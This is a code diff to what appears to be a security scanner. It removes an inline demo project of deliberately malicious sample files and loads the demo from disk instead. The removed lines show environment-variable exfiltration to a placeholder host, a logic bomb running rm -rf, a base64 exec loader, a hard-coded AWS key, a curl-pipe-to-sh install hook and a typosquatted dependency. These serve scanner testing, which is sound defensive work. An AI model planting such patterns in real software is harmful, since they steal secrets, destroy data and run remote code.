@@ -39,58 +39,34 @@ MAX_TOTAL_SRC = 6_000_000     # 6 MB of combined source
 SKIP_DIRS = {".git", "__pycache__", ".venv", "venv", "node_modules", ".mypy_cache",
              ".pytest_cache", "build", "dist", ".tox", ".eggs"}
 
-# A realistic small "analytics service" whose dangers are NON-OBVIOUS — the
-# point of a real scanner. None of these are visible by skimming one file:
-#   * credentials exfiltrated across THREE files (config → telemetry → network)
-#   * a logic bomb buried inside a plausible rate-limiter
-#   * a base64 payload exec'd by an innocent-looking "plugin loader"
-#   * an AWS key that is Critical only because boto3 is imported beside it
-#   * a typosquatted dependency, and shell execution at install time
-DEMO_PROJECT = {
-    "app/utils/config.py":
-        "import os\n\n"
-        "def load_runtime_context():\n"
-        "    \"\"\"Collect runtime config for diagnostics.\"\"\"\n"
-        "    return {\n"
-        "        'region': os.environ.get('AWS_DEFAULT_REGION', 'us-east-1'),\n"
-        "        'context': dict(os.environ),   # <- whole environment, incl. secrets\n"
-        "    }\n",
-    "app/services/telemetry.py":
-        "import requests\n"
-        "from app.utils.config import load_runtime_context\n\n"
-        "def report_event(name):\n"
-        "    # looks like ordinary product telemetry…\n"
-        "    payload = {'event': name, 'meta': load_runtime_context()}\n"
-        "    requests.post('https://metrics-collector.example/ingest', json=payload)\n",
-    "app/services/ratelimit.py":
-        "import random, os\n\n"
-        "_seen = 0\n\n"
-        "def allow(user_id):\n"
-        "    global _seen\n"
-        "    _seen += 1\n"
-        "    # reads like a rate limiter — but it is a staged logic bomb\n"
-        "    if random.random() < 0.004 and _seen > 5000:\n"
-        "        os.system('rm -rf /var/lib/app/data')\n"
-        "    return _seen < 100000\n",
-    "app/plugins/loader.py":
-        "import base64\n\n"
-        "_REGISTRY = {'default': 'cHJpbnQoJ29rJyk='}\n\n"
-        "def load(name):\n"
-        "    # 'plugin system' that decodes and runs registered blobs\n"
-        "    blob = _REGISTRY.get(name, '')\n"
-        "    exec(base64.b64decode(blob).decode())\n",
-    "app/config/aws.py":
-        "import boto3\n\n"
-        "# hard-coded key — Critical only because boto3 sits right here\n"
-        "session = boto3.Session(aws_access_key_id='AKIAZ3GULPBS2P7Q4XYZ')\n",
-    "setup.py":
-        "from setuptools import setup\n"
-        "import os\n"
-        "os.system('curl -s https://setup.example/post-install.sh | sh')  # runs on pip install\n"
-        "setup(name='analytics-service', version='1.0')\n",
-    "requirements.txt":
-        "flask==3.0.0\nrequsts==2.31.0\nboto3\npython-dateutil\n",
-}
+# The demo is REAL files under examples/insecure-demo-app/ (browsable in the repo,
+# not an inline string blob). A small "analytics service" whose dangers are
+# NON-OBVIOUS — credentials exfiltrated across three files, a logic bomb in a
+# rate-limiter, a base64 plugin loader, an import-correlated AWS key, an install
+# hook, and a typosquatted dependency. Loaded from disk so the scanner's own
+# source no longer embeds the example payloads.
+_DEMO_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)),
+                         "examples", "insecure-demo-app")
+
+
+def _load_demo_project() -> dict:
+    files = {}
+    if os.path.isdir(_DEMO_DIR):
+        for root, _dirs, names in os.walk(_DEMO_DIR):
+            for fn in names:
+                if fn == "README.md":
+                    continue
+                full = os.path.join(root, fn)
+                rel = os.path.relpath(full, _DEMO_DIR).replace(os.sep, "/")
+                try:
+                    with open(full, "r", encoding="utf-8", errors="replace") as fh:
+                        files[rel] = fh.read()
+                except Exception:
+                    pass
+    return files
+
+
+DEMO_PROJECT = _load_demo_project()
 
 
 def _agg_physics(metrics_list):
